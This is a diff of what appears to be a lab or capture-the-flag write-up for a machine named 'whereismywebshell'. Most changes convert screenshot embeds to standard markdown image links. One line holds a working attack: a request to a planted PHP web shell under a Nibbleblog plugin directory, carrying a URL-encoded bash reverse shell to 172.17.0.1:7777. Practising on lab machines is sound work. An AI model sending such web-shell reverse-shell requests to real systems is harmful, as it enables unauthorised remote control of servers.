@@ -1,22 +1,22 @@
-![[Pasted image 20250224112721.png]]
+![](images/images-whereismywebshell/Pasted%20image%2020250224112721.png)
 
-![[Pasted image 20250224113243.png]]
+![](images/images-whereismywebshell/Pasted%20image%2020250224113243.png)
 
-![[Pasted image 20250224113426.png]]
+![](images/images-whereismywebshell/Pasted%20image%2020250224113426.png)
 
-![[Pasted image 20250224113710.png]]
+![](images/images-whereismywebshell/Pasted%20image%2020250224113710.png)
 
-![[Pasted image 20250224113731.png]]
+![](images/images-whereismywebshell/Pasted%20image%2020250224113731.png)
 
-![[Pasted image 20250224114130.png]]
+![](images/images-whereismywebshell/Pasted%20image%2020250224114130.png)
 
-![[Pasted image 20250224115315.png]]
+![](images/images-whereismywebshell/Pasted%20image%2020250224115315.png)
 
-![[Pasted image 20250224115453.png]]
+![](images/images-whereismywebshell/Pasted%20image%2020250224115453.png)
 
-![[Pasted image 20250224120034.png]]
+![](images/images-whereismywebshell/Pasted%20image%2020250224120034.png)
 
-![[Pasted image 20250224162035.png]]
+![](images/images-whereismywebshell/Pasted%20image%2020250224162035.png)
 
 ``` python
 #!/usr/bin/python3
@@ -156,12 +156,12 @@ while True:
     time.sleep(1.1)
 ```
 
-![[Pasted image 20250225163304.png]]
+![](images/images-whereismywebshell/Pasted%20image%2020250225163304.png)
 
-![[Pasted image 20250225175529.png]]
+![](images/images-whereismywebshell/Pasted%20image%2020250225175529.png)
 
 http://172.17.0.2/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash%20-i%20>%26%20/dev/tcp/172.17.0.1/7777%200>%261
 
-![[Pasted image 20250226103856.png]]
+![](images/images-whereismywebshell/Pasted%20image%2020250226103856.png)
 
-![[Pasted image 20250226103812.png]]
+![](images/images-whereismywebshell/Pasted%20image%2020250226103812.png)
